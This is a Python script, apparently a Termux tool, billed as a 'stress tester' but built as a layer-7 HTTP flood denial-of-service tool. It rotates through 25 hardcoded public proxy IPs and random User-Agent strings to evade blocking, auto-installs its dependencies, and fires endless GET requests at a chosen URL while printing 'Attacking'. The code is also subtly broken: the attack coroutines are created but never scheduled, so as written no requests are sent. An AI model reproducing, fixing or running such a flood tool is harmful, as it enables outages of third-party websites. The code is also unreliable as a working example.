#!/usr/bin/env python3
import sys
import subprocess
import os

# TỰ ĐỘNG CÀI ĐẶT DEPENDENCIES
def install_dependencies():
    required_packages = ['aiohttp', 'fake-useragent', 'colorama', 'aiohttp_socks']
    for package in required_packages:
        try:
            if package == 'fake-useragent': __import__('fake_useragent')
            elif package == 'aiohttp_socks': __import__('aiohttp_socks')
            else: __import__(package)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

install_dependencies()

import asyncio
import aiohttp
import random
import threading
import time
import argparse
from fake_useragent import UserAgent
from colorama import Fore, Style, init
from aiohttp_socks import ProxyConnector

init(autoreset=True)

class SmartProxyManager:
    def __init__(self):
        self.proxy_list = []
        self.active_proxies = []
        self.dead_proxies = []
        self.lock = threading.Lock()
        self.load_proxies()
        
    def load_proxies(self):
        proxies = [
            {"id": 1, "country": "US", "type": "http", "proxy": "http://138.197.157.32:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 2, "country": "UK", "type": "http", "proxy": "http://51.159.154.37:3128", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 3, "country": "DE", "type": "http", "proxy": "http://88.198.24.108:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 4, "country": "FR", "type": "socks5", "proxy": "socks5://145.239.85.58:9300", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 5, "country": "JP", "type": "http", "proxy": "http://118.27.113.167:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 6, "country": "KR", "type": "http", "proxy": "http://112.175.32.178:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 7, "country": "SG", "type": "http", "proxy": "http://128.199.202.122:3128", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 8, "country": "IN", "type": "http", "proxy": "http://103.216.51.210:8191", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 9, "country": "CA", "type": "http", "proxy": "http://144.217.101.245:3129", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 10, "country": "AU", "type": "http", "proxy": "http://203.33.113.80:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 11, "country": "BR", "type": "http", "proxy": "http://200.236.216.242:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 12, "country": "RU", "type": "socks5", "proxy": "socks5://95.217.210.191:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 13, "country": "CN", "type": "http", "proxy": "http://112.6.117.135:8085", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 14, "country": "VN", "type": "http", "proxy": "http://14.241.39.165:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 15, "country": "TH", "type": "http", "proxy": "http://118.175.93.103:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 16, "country": "ID", "type": "http", "proxy": "http://139.255.123.194:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 17, "country": "MY", "type": "http", "proxy": "http://103.119.55.18:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 18, "country": "PH", "type": "http", "proxy": "http://110.232.86.129:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 19, "country": "NL", "type": "http", "proxy": "http://51.158.68.68:8811", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 20, "country": "CH", "type": "socks5", "proxy": "socks5://185.230.46.238:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 21, "country": "SE", "type": "http", "proxy": "http://185.204.197.169:8080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 22, "country": "NO", "type": "http", "proxy": "http://51.159.154.37:3130", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 23, "country": "FI", "type": "http", "proxy": "http://95.217.210.191:8081", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 24, "country": "DK", "type": "http", "proxy": "http://185.204.197.169:8081", "latency": 0, "success": 0, "fail": 0, "status": "unknown"},
            {"id": 25, "country": "IT", "type": "socks5", "proxy": "socks5://138.197.157.32:1080", "latency": 0, "success": 0, "fail": 0, "status": "unknown"}
        ]
        self.proxy_list = proxies
        self.active_proxies = proxies.copy()
        print(f"{Fore.GREEN}[✓] Loaded {len(proxies)} proxies with health monitoring!")

    async def check_proxy_health(self, proxy_info):
        try:
            start_time = time.time()
            connector = ProxyConnector.from_url(proxy_info['proxy']) if proxy_info['type'] == 'socks5' else None
            proxy_url = None if proxy_info['type'] == 'socks5' else proxy_info['proxy']
            
            async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=5)) as session:
                async with session.get("http://httpbin.org/ip", proxy=proxy_url) as resp:
                    if resp.status == 200:
                        proxy_info['latency'] = (time.time() - start_time) * 1000
                        proxy_info['status'] = 'alive'
                        return True
            return False
        except:
            proxy_info['status'] = 'dead'
            return False

    async def health_check_all(self):
        print(f"{Fore.YELLOW}[*] Checking proxy health...")
        tasks = [self.check_proxy_health(p) for p in self.proxy_list]
        await asyncio.gather(*tasks)
        with self.lock:
            self.active_proxies = [p for p in self.proxy_list if p['status'] == 'alive']
        return len(self.active_proxies)

    def get_smart_proxy(self):
        with self.lock:
            if not self.active_proxies: return None
            # Ưu tiên proxy latency thấp
            sorted_p = sorted(self.active_proxies, key=lambda x: x['latency'])
            return random.choice(sorted_p[:5])

    def mark_proxy_failed(self, proxy):
        with self.lock:
            proxy['fail'] += 1
            if proxy['fail'] >= 3:
                proxy['status'] = 'dead'
                if proxy in self.active_proxies: self.active_proxies.remove(proxy)

    def mark_proxy_success(self, proxy):
        with self.lock: proxy['success'] += 1

class KhangStressTesterV4:
    def __init__(self):
        self.ua = UserAgent()
        self.proxy_manager = SmartProxyManager()
        self.requests_sent = 0
        self.running = True
        self.lock = threading.Lock()

    def print_banner(self):
        print(f"{Fore.RED}╔══════════════════════════════════════════╗")
        print(f"║    {Fore.WHITE}KHANG TERMUX LAYER 7 V4{Fore.RED}               ║")
        print(f"║   {Fore.YELLOW}SMART PROXY FAILOVER SYSTEM{Fore.RED}          ║")
        print(f"╚══════════════════════════════════════════╝\n")

    async def attack_task(self, target, use_proxy):
        while self.running:
            proxy_info = self.proxy_manager.get_smart_proxy() if use_proxy else None
            connector = None
            proxy_url = None
            
            if use_proxy and proxy_info:
                if proxy_info['type'] == 'socks5': connector = ProxyConnector.from_url(proxy_info['proxy'])
                else: proxy_url = proxy_info['proxy']

            try:
                async with aiohttp.ClientSession(connector=connector, timeout=aiohttp.ClientTimeout(total=10)) as session:
                    headers = {'User-Agent': self.ua.random, 'Connection': 'keep-alive'}
                    async with session.get(target, headers=headers, proxy=proxy_url, ssl=False) as resp:
                        with self.lock:
                            self.requests_sent += 1
                            if resp.status == 200:
                                if proxy_info: self.proxy_manager.mark_proxy_success(proxy_info)
                            else:
                                if proxy_info: self.proxy_manager.mark_proxy_failed(proxy_info)
            except:
                with self.lock:
                    self.requests_sent += 1
                    if proxy_info: self.proxy_manager.mark_proxy_failed(proxy_info)
                await asyncio.sleep(0.1)

    async def main(self):
        parser = argparse.ArgumentParser()
        parser.add_argument("url", help="Target URL")
        parser.add_argument("-t", "--threads", type=int, default=100)
        parser.add_argument("--proxy", action="store_true", default=True)
        args = parser.parse_args()

        self.print_banner()
        if args.proxy:
            alive = await self.proxy_manager.health_check_all()
            print(f"{Fore.CYAN}[*] Active Proxies: {alive}")

        print(f"{Fore.GREEN}[+] Attacking {args.url} with {args.threads} tasks...")
        
        tasks = [self.attack_task(args.url, args.proxy) for _ in range(args.threads)]
        
        # Monitor tiến độ
        try:
            while True:
                print(f"{Fore.WHITE}Requests Sent: {Fore.YELLOW}{self.requests_sent:,}", end='\r')
                await asyncio.sleep(1)
        except KeyboardInterrupt:
            self.running = False
            print(f"\n{Fore.RED}[!] Stopping...")

if __name__ == "__main__":
    tester = KhangStressTesterV4()
    asyncio.run(tester.main())

